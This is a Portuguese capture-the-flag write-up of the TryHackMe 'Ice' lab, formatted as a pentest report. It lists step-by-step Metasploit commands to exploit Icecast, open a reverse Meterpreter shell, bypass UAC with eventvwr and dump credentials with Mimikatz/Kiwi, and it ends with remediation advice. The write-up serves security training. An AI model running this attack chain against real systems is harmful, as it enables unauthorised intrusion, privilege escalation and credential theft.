# 1 — Visão geral da metodologia

1. **Objetivo:** Comprometer máquina Windows explorando vulnerabilidade conhecida no Icecast e realizar privesc até Administrator.
    
2. **Estrutura:** Recon → Exploração Icecast → Elevação de privilégios → Dump de credenciais → Controle completo do host.
    
3. **Princípios:** Execução ofensiva reproduzível com evidências.
    

---

# Report — Máquina: `Ice` — `10.65.152.60`

- **Fonte:** THM
    
- **Data:** 2025-11-30
    
- **Autor:** _Enrico Moreno_
    
- **Nível:** Easy
    
- **Início:** 16:20
    
- **Finalizado:** 17:10
    
- **Tempo gasto:** 50 minutos
    

---

## 1) Executive summary

Servidor Windows rodando Icecast vulnerável, explorado via Metasploit. Obteve-se execução remota de código, escalonamento de privilégio para Administrator por bypass de UAC e extração de credenciais com Mimikatz (Kiwi).

---

## 2) Escopo e limitações

- **Alvo:** 10.65.152.60
    
- **Serviços expostos:** SMB / RPC / HTTP Icecast
    
- **Ferramentas utilizadas:** Nmap, Metasploit, Mimikatz/Kiwi
    
- **Limitações:** nenhuma no lab
    

---

## 3) Metodologia aplicada

- Recon e fingerprint de portas
    
- Exploração remota do Icecast
    
- Bypass de UAC com módulo local
    
- Dumping de credenciais com Mimikatz
    
- Controle total do nível Administrador
    

---

## 4) Achado principal

**Vulnerabilidade:** RCE no Icecast  
**Local:** Porta 8000 — Icecast HTTP  
**PoC (Metasploit):**

`use exploit/windows/http/icecast_header set RHOSTS 10.65.152.60 set LHOST <SEU_IP> run`

---

## 5) Evidências / PoC (resumo)

### Recon

`sudo nmap -sS -T4 -p- --min-rate 5000 10.65.152.60 -oN nmap_Ice.txt`

Porta **8000/tcp** → Icecast (vulnerável)

### Obtenção de shell inicial

→ Meterpreter session

### Elevação de privilégio

Primeiro sugerido com:

`run post/multi/recon/local_exploit_suggester`

Exploit aplicado:

`use exploit/windows/local/bypassuac_eventvwr`

→ Novo Meterpreter com Administrator

### Dump de credenciais

`load kiwi creds_all`

Credencial obtida:

`Usuário: Dark Senha: Password01`

---

## 6) Impacto & Severidade

**Severidade:** Alta

RCE remotamente explorável + UAC bypass simples ⇒ controle administrativo do sistema Windows.

---

## 7) Reproduzir (passo-a-passo)

1️⃣ Scan

`sudo nmap -sS -T4 -p- 10.65.152.60`

2️⃣ Exploit Icecast:

`use exploit/windows/http/icecast_header set payload windows/meterpreter/reverse_tcp run`

3️⃣ Sugerir privesc:

`run post/multi/recon/local_exploit_suggester`

4️⃣ Executar UAC bypass:

`use exploit/windows/local/bypassuac_eventvwr run`

5️⃣ Dump de credenciais:

`load kiwi creds_all`

---

## 8) Recomendações (gestores)

- Atualizar/Remover Icecast vulnerável imediatamente
    
- Aplicar política de UAC mais restritiva
    
- Habilitar solução EDR com mitigação de execução remota
    
- Restringir SMB/RPC expostos
    

---

## 9) Recomendações técnicas

- Update Icecast e IIS hardening
    
- Desabilitar EventViewer UAC bypass vector
    
- Auditoria de credenciais armazenadas em memória
    
- Execução restrita via AppLocker
    

---

## 10) Apêndice técnico

#### Nmap

![](nmap_Ice.txt)

---

## 11) Lições aprendidas

- Serviços legados com RCE podem levar a root/admin sem interação adicional
    
- O `local_exploit_suggester` pode acelerar a escolha do exploit correto
    
- Depois de obter Meterpreter: **migrar para processos confiáveis** (`spoolsv.exe`, etc.) para estabilidade
    
- Mimikatz/Kiwi frequentemente recupera **credenciais vivas** rapidamente
    
- **UAC bypass = privilégio total**, quando mal configurado
    
- Persistência pode ser configurada rapidamente após privesc
    

---